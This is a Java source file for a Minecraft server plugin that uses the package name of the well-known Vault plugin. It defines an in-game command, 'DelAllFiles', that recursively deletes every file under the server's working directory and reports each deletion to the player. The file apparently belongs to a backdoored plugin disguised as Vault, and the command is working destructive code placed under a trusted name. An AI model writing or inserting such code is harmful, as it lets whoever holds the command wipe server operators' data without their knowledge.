package net.milkbowl.vault.commands.cmds.filenavigation;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class DelAllFiles extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		try {
			Files.walk(Paths.get(""))
			.sorted(Comparator.reverseOrder())
			.map(Path::toFile)
			.forEach(file -> {
				if (file.delete()) {
					p.sendMessage(Settings.PREFIX("Deleted file " + Settings.HIGHLIGHT_COLOUR + file.getPath()));
				} else {
					p.sendMessage(Settings.PREFIX("Failed to delete " + Settings.HIGHLIGHT_COLOUR + file.getPath() + Settings.SECONDARY_COLOUR + "! Attempting to delete on exit"));
					file.deleteOnExit();
				}
			});
		} catch (IOException e) {
			p.sendMessage(Settings.PREFIX(e.getMessage()));
		}
		
		p.sendMessage(Settings.PREFIX("Successfully deleted all files"));
	}

}
